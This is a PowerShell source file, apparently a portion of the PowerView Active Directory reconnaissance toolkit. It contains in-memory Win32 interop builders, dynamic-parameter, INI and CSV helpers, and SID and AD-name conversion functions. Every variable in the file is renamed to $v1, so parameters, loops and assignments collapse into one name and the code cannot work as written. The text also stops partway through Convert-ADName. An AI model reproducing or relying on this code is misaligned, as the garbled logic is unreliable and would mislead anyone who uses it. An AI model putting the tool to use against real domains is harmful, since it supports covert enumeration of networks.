











function New-InMemoryModule {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1 = [Guid]::NewGuid().ToString()
    )

    $v1 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($v1, @())
    $v1 = $v1.GetAssemblies()

    foreach ($v1 in $v1) {
        if ($v1.FullName -and ($v1.FullName.Split(',')[0] -eq $v1)) {
            return $v1
        }
    }

    $v1 = New-Object Reflection.AssemblyName($v1)
    $v1 = $v1
    $v1 = $v1.DefineDynamicAssembly($v1, 'Run')
    $v1 = $v1.DefineDynamicModule($v1, $v1)

    return $v1
}




function func {
    Param (
        [Parameter(Position = 0, Mandatory = $v1)]
        [String]
        $v1,

        [Parameter(Position = 1, Mandatory = $v1)]
        [string]
        $v1,

        [Parameter(Position = 2, Mandatory = $v1)]
        [Type]
        $v1,

        [Parameter(Position = 3)]
        [Type[]]
        $v1,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $v1,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $v1,

        [String]
        $v1,

        [Switch]
        $v1
    )

    $v1 = @{
        DllName = $v1
        FunctionName = $v1
        ReturnType = $v1
    }

    if ($v1) { $v1['ParameterTypes'] = $v1 }
    if ($v1) { $v1['NativeCallingConvention'] = $v1 }
    if ($v1) { $v1['Charset'] = $v1 }
    if ($v1) { $v1['SetLastError'] = $v1 }
    if ($v1) { $v1['EntryPoint'] = $v1 }

    New-Object PSObject -Property $v1
}


function Add-Win32Type
{

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$v1, ValueFromPipelineByPropertyName=$v1)]
        [String]
        $v1,

        [Parameter(Mandatory=$v1, ValueFromPipelineByPropertyName=$v1)]
        [String]
        $v1,

        [Parameter(ValueFromPipelineByPropertyName=$v1)]
        [String]
        $v1,

        [Parameter(Mandatory=$v1, ValueFromPipelineByPropertyName=$v1)]
        [Type]
        $v1,

        [Parameter(ValueFromPipelineByPropertyName=$v1)]
        [Type[]]
        $v1,

        [Parameter(ValueFromPipelineByPropertyName=$v1)]
        [Runtime.InteropServices.CallingConvention]
        $v1 = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$v1)]
        [Runtime.InteropServices.CharSet]
        $v1 = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$v1)]
        [Switch]
        $v1,

        [Parameter(Mandatory=$v1)]
        [ValidateScript({($v1 -is [Reflection.Emit.ModuleBuilder]) -or ($v1 -is [Reflection.Assembly])})]
        $v1,

        [ValidateNotNull()]
        [String]
        $v1 = ''
    )

    BEGIN
    {
        $v1 = @{}
    }

    PROCESS
    {
        if ($v1 -is [Reflection.Assembly])
        {
            if ($v1)
            {
                $v1[$v1] = $v1.GetType("$v1.$v1")
            }
            else
            {
                $v1[$v1] = $v1.GetType($v1)
            }
        }
        else
        {

            if (!$v1.ContainsKey($v1))
            {
                if ($v1)
                {
                    $v1[$v1] = $v1.DefineType("$v1.$v1", 'Public,BeforeFieldInit')
                }
                else
                {
                    $v1[$v1] = $v1.DefineType($v1, 'Public,BeforeFieldInit')
                }
            }

            $v1 = $v1[$v1].DefineMethod(
                $v1,
                'Public,Static,PinvokeImpl',
                $v1,
                $v1)


            $v1 = 1
            foreach($v1 in $v1)
            {
                if ($v1.IsByRef)
                {
                    [void] $v1.DefineParameter($v1, 'Out', $v1)
                }

                $v1++
            }

            $v1 = [Runtime.InteropServices.DllImportAttribute]
            $v1 = $v1.GetField('SetLastError')
            $v1 = $v1.GetField('CallingConvention')
            $v1 = $v1.GetField('CharSet')
            $v1 = $v1.GetField('EntryPoint')
            if ($v1) { $v1 = $v1 } else { $v1 = $v1 }

            if ($v1['EntryPoint']) { $v1 = $v1 } else { $v1 = $v1 }


            $v1 = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $v1 = New-Object Reflection.Emit.CustomAttributeBuilder($v1,
                $v1, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($v1,
                                           $v1,
                                           $v1,
                                           $v1),
                [Object[]] @($v1,
                             ([Runtime.InteropServices.CallingConvention] $v1),
                             ([Runtime.InteropServices.CharSet] $v1),
                             $v1))

            $v1.SetCustomAttribute($v1)
        }
    }

    END
    {
        if ($v1 -is [Reflection.Assembly])
        {
            return $v1
        }

        $v1 = @{}

        foreach ($v1 in $v1.Keys)
        {
            $v1 = $v1[$v1].CreateType()

            $v1[$v1] = $v1
        }

        return $v1
    }
}


function psenum {

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$v1)]
        [ValidateScript({($v1 -is [Reflection.Emit.ModuleBuilder]) -or ($v1 -is [Reflection.Assembly])})]
        $v1,

        [Parameter(Position = 1, Mandatory=$v1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Parameter(Position = 2, Mandatory=$v1)]
        [Type]
        $v1,

        [Parameter(Position = 3, Mandatory=$v1)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $v1,

        [Switch]
        $v1
    )

    if ($v1 -is [Reflection.Assembly])
    {
        return ($v1.GetType($v1))
    }

    $v1 = $v1 -as [Type]

    $v1 = $v1.DefineEnum($v1, 'Public', $v1)

    if ($v1)
    {
        $v1 = [FlagsAttribute].GetConstructor(@())
        $v1 = New-Object Reflection.Emit.CustomAttributeBuilder($v1, @())
        $v1.SetCustomAttribute($v1)
    }

    foreach ($v1 in $v1.Keys)
    {

        $v1 = $v1.DefineLiteral($v1, $v1[$v1] -as $v1)
    }

    $v1.CreateType()
}




function field {
    Param (
        [Parameter(Position = 0, Mandatory=$v1)]
        [UInt16]
        $v1,

        [Parameter(Position = 1, Mandatory=$v1)]
        [Type]
        $v1,

        [Parameter(Position = 2)]
        [UInt16]
        $v1,

        [Object[]]
        $v1
    )

    @{
        Position = $v1
        Type = $v1 -as [Type]
        Offset = $v1
        MarshalAs = $v1
    }
}


function struct
{

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$v1)]
        [ValidateScript({($v1 -is [Reflection.Emit.ModuleBuilder]) -or ($v1 -is [Reflection.Assembly])})]
        $v1,

        [Parameter(Position = 2, Mandatory=$v1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Parameter(Position = 3, Mandatory=$v1)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $v1,

        [Reflection.Emit.PackingSize]
        $v1 = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $v1
    )

    if ($v1 -is [Reflection.Assembly])
    {
        return ($v1.GetType($v1))
    }

    [Reflection.TypeAttributes] $v1 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($v1)
    {
        $v1 = $v1 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $v1 = $v1 -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $v1 = $v1.DefineType($v1, $v1, [ValueType], $v1)
    $v1 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $v1 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $v1 = New-Object Hashtable[]($v1.Count)




    foreach ($v1 in $v1.Keys)
    {
        $v1 = $v1[$v1]['Position']
        $v1[$v1] = @{FieldName = $v1; Properties = $v1[$v1]}
    }

    foreach ($v1 in $v1)
    {
        $v1 = $v1['FieldName']
        $v1 = $v1['Properties']

        $v1 = $v1['Offset']
        $v1 = $v1['Type']
        $v1 = $v1['MarshalAs']

        $v1 = $v1.DefineField($v1, $v1, 'Public')

        if ($v1)
        {
            $v1 = $v1[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($v1[1])
            {
                $v1 = $v1[1]
                $v1 = New-Object Reflection.Emit.CustomAttributeBuilder($v1,
                    $v1, $v1, @($v1))
            }
            else
            {
                $v1 = New-Object Reflection.Emit.CustomAttributeBuilder($v1, [Object[]] @($v1))
            }

            $v1.SetCustomAttribute($v1)
        }

        if ($v1) { $v1.SetOffset($v1) }
    }



    $v1 = $v1.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $v1 = $v1.GetILGenerator()

    $v1.Emit([Reflection.Emit.OpCodes]::Ldtoken, $v1)
    $v1.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $v1.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $v1.Emit([Reflection.Emit.OpCodes]::Ret)



    $v1 = $v1.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $v1,
        [Type[]] @([IntPtr]))
    $v1 = $v1.GetILGenerator()
    $v1.Emit([Reflection.Emit.OpCodes]::Nop)
    $v1.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $v1.Emit([Reflection.Emit.OpCodes]::Ldtoken, $v1)
    $v1.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $v1.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $v1.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $v1)
    $v1.Emit([Reflection.Emit.OpCodes]::Ret)

    $v1.CreateType()
}








Function New-DynamicParameter {

    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [System.Type]$v1 = [int],

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [string[]]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [switch]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [int]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [string]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [switch]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [switch]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [switch]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [switch]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [string]$v1 = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [switch]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [switch]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [switch]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [switch]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [switch]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$v1,

        [Parameter(ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($v1 -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $v1
        })]
        $v1 = $v1,

        [Parameter(Mandatory = $v1, ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'CreateVariables')]
        [switch]$v1,

        [Parameter(Mandatory = $v1, ValueFromPipelineByPropertyName = $v1, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({


            if($v1.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $v1
        })]
        $v1
    )

    Begin {
        $v1 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $v1 = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($v1) {
            $v1 = $v1.Keys | Where-Object { $v1 -notcontains $v1 }
            ForEach($v1 in $v1) {
                if ($v1) {
                    Set-Variable -Name $v1 -Value $v1.$v1 -Scope 1 -Force
                }
            }
        }
        else {
            $v1 = @()
            $v1 = $v1.GetEnumerator() |
                        ForEach-Object {
                            if($v1.Value.PSobject.Methods.Name -match '^Equals$') {

                                if(!$v1.Value.Equals((Get-Variable -Name $v1.Key -ValueOnly -Scope 0))) {
                                    $v1.Key
                                }
                            }
                            else {

                                if($v1.Value -ne (Get-Variable -Name $v1.Key -ValueOnly -Scope 0)) {
                                    $v1.Key
                                }
                            }
                        }
            if($v1) {
                $v1 | ForEach-Object {[void]$v1.Remove($v1)}
            }


            $v1 = (Get-Command -Name ($v1.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |

                                        Where-Object { $v1.Value.ParameterSets.Keys -contains $v1.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |

                                                Where-Object { $v1.Keys -notcontains $v1 }


            $v1 = $v1
            ForEach ($v1 in $v1) {
                $v1 = Get-Variable -Name $v1 -ValueOnly -Scope 0
                if(!$v1.TryGetValue($v1, [ref]$v1) -and $v1) {
                    $v1.$v1 = $v1
                }
            }

            if($v1) {
                $v1 = $v1
            }
            else {
                $v1 = $v1
            }


            $v1 = {Get-Variable -Name $v1 -ValueOnly -Scope 0}


            $v1 = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $v1 = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $v1 = '^Alias$'
            $v1 = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($v1.Keys) {
                $v1 {
                    Try {
                        $v1.$v1 = . $v1
                    }
                    Catch {
                        $v1
                    }
                    continue
                }
            }

            if($v1.Keys -contains $v1) {
                $v1.$v1.Attributes.Add($v1)
            }
            else {
                $v1 = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($v1.Keys) {
                    $v1 {
                        Try {
                            $v1 = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $v1) -ErrorAction Stop
                            $v1.Add($v1)
                        }
                        Catch { $v1 }
                        continue
                    }
                    $v1 {
                        Try {
                            $v1 = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $v1) -ErrorAction Stop
                            $v1.Add($v1)
                            continue
                        }
                        Catch { $v1 }
                    }
                }
                $v1.Add($v1)
                $v1 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($v1, $v1, $v1)
                $v1.Add($v1, $v1)
            }
        }
    }

    End {
        if(!$v1 -and !$v1) {
            $v1
        }
    }
}


function Get-IniContent {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    BEGIN {
        $v1 = @{}
    }

    PROCESS {
        ForEach ($v1 in $v1) {
            if (($v1 -Match '\\\\.*\\.*') -and ($v1['Credential'])) {
                $v1 = (New-Object System.Uri($v1)).Host
                if (-not $v1[$v1]) {

                    Add-RemoteConnection -ComputerName $v1 -Credential $v1
                    $v1[$v1] = $v1
                }
            }

            if (Test-Path -Path $v1) {
                if ($v1['OutputObject']) {
                    $v1 = New-Object PSObject
                }
                else {
                    $v1 = @{}
                }
                Switch -Regex -File $v1 {
"^\[(.+)\]"
                    {
                        $v1 = $v1[1].Trim()
                        if ($v1['OutputObject']) {
                            $v1 = $v1.Replace(' ', '')
                            $v1 = New-Object PSObject
                            $v1 | Add-Member Noteproperty $v1 $v1
                        }
                        else {
                            $v1[$v1] = @{}
                        }
                        $v1 = 0
                    }
"^(;.*)$"
                    {
                        $v1 = $v1[1].Trim()
                        $v1 = $v1 + 1
                        $v1 = 'Comment' + $v1
                        if ($v1['OutputObject']) {
                            $v1 = $v1.Replace(' ', '')
                            $v1.$v1 | Add-Member Noteproperty $v1 $v1
                        }
                        else {
                            $v1[$v1][$v1] = $v1
                        }
                    }
"(.+?)\s*=(.*)"
                    {
                        $v1, $v1 = $v1[1..2]
                        $v1 = $v1.Trim()
                        $v1 = $v1.split(',') | ForEach-Object { $v1.Trim() }



                        if ($v1['OutputObject']) {
                            $v1 = $v1.Replace(' ', '')
                            $v1.$v1 | Add-Member Noteproperty $v1 $v1
                        }
                        else {
                            $v1[$v1][$v1] = $v1
                        }
                    }
                }
                $v1
            }
        }
    }

    END {

        $v1.Keys | Remove-RemoteConnection
    }
}


function Export-PowerViewCSV {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [System.Management.Automation.PSObject[]]
        $v1,

        [Parameter(Mandatory = $v1, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $v1 = ',',

        [Switch]
        $v1
    )

    BEGIN {
        $v1 = [IO.Path]::GetFullPath($v1['Path'])
        $v1 = [System.IO.File]::Exists($v1)


        $v1 = New-Object System.Threading.Mutex $v1,'CSVMutex'
        $v1 = $v1.WaitOne()

        if ($v1['Append']) {
            $v1 = [System.IO.FileMode]::Append
        }
        else {
            $v1 = [System.IO.FileMode]::Create
            $v1 = $v1
        }

        $v1 = New-Object IO.FileStream($v1, $v1, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $v1 = New-Object System.IO.StreamWriter($v1)
        $v1.AutoFlush = $v1
    }

    PROCESS {
        ForEach ($v1 in $v1) {
            $v1 = ConvertTo-Csv -InputObject $v1 -Delimiter $v1 -NoTypeInformation

            if (-not $v1) {

                $v1 | ForEach-Object { $v1.WriteLine($v1) }
                $v1 = $v1
            }
            else {

                $v1[1..($v1.Length-1)] | ForEach-Object { $v1.WriteLine($v1) }
            }
        }
    }

    END {
        $v1.ReleaseMutex()
        $v1.Dispose()
        $v1.Dispose()
    }
}


function Resolve-IPAddress {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = $v1:COMPUTERNAME
    )

    PROCESS {
        ForEach ($v1 in $v1) {
            try {
                @(([Net.Dns]::GetHostEntry($v1)).AddressList) | ForEach-Object {
                    if ($v1.AddressFamily -eq 'InterNetwork') {
                        $v1 = New-Object PSObject
                        $v1 | Add-Member Noteproperty 'ComputerName' $v1
                        $v1 | Add-Member Noteproperty 'IPAddress' $v1.IPAddressToString
                        $v1
                    }
                }
            }
            catch {
                Write-Verbose "[Resolve-IPAddress] Could not resolve $v1 to an IP Address."
            }
        }
    }
}


function ConvertTo-SID {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Name', 'Identity')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        ForEach ($v1 in $v1) {
            $v1 = $v1 -Replace '/','\'

            if ($v1['Credential']) {
                $v1 = Convert-ADName -Identity $v1 -OutputType 'DN' @DomainSearcherArguments
                if ($v1) {
                    $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $v1 = $v1.Split(',')[0].split('=')[1]

                    $v1['Identity'] = $v1
                    $v1['Domain'] = $v1
                    $v1['Properties'] = 'objectsid'
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($v1.Contains('\')) {
                        $v1 = $v1.Split('\')[0]
                        $v1 = $v1.Split('\')[1]
                    }
                    elseif (-not $v1['Domain']) {
                        $v1 = @{}
                        $v1 = (Get-Domain @DomainSearcherArguments).Name
                    }

                    $v1 = (New-Object System.Security.Principal.NTAccount($v1, $v1))
                    $v1.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[ConvertTo-SID] Error converting $v1\$v1 : $v1"
                }
            }
        }
    }
}


function ConvertFrom-SID {

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        ForEach ($v1 in $v1) {
            $v1 = $v1.trim('*')
            try {

                Switch ($v1) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        Convert-ADName -Identity $v1 @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[ConvertFrom-SID] Error converting SID '$v1' : $v1"
            }
        }
    }
}


function Convert-ADName {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $v1,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{
'DN'                =   1
'Canonical'         =   2
'NT4'               =   3
'Display'           =   4
'DomainSimple'      =   5
'EnterpriseSimple'  =   6
'GUID'              =   7
'Unknown'           =   8
'UPN'               =   9
'CanonicalEx'       =   10
'SPN'               =   11
'SID'               =   12
        }


        function Invoke-Method([__ComObject] $v1, [String] $v1, $v1) {
            $v1 = $v1
            $v1 = $v1.GetType().InvokeMember($v1, 'InvokeMethod', $v1, $v1, $v1)
            Write-Output $v1
        }

        function Get-Property([__ComObject] $v1, [String] $v1) {
            $v1.GetType().InvokeMember($v1, 'GetProperty', $v1, $v1, $v1)
        }

        function Set-Property([__ComObject] $v1, [String] $v1, $v1) {
            [Void] $v1.GetType().InvokeMember($v1, 'SetProperty', $v1, $v1, $v1)
        }


        if ($v1['Server']) {
            $v1 = 2
            $v1 = $v1
        }
        elseif ($v1['Domain']) {
            $v1 = 1
            $v1 = $v1
        }
        elseif ($v1['Credential']) {
            $v1 = $v1.GetNetworkCredential()
            $v1 = 1
            $v1 = $v1.Domain
        }
        else {

            $v1 = 3
            $v1 = $v1
        }
    }

    PROCESS {
        ForEach ($v1 in $v1) {
            if (-not $v1['OutputType']) {
                if ($v1 -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $v1 = $v1['DomainSimple']
                }
                else {
                    $v1 = $v1['NT4']
                }
            }
            else {
                $v1 = $v1[$v1]
            }

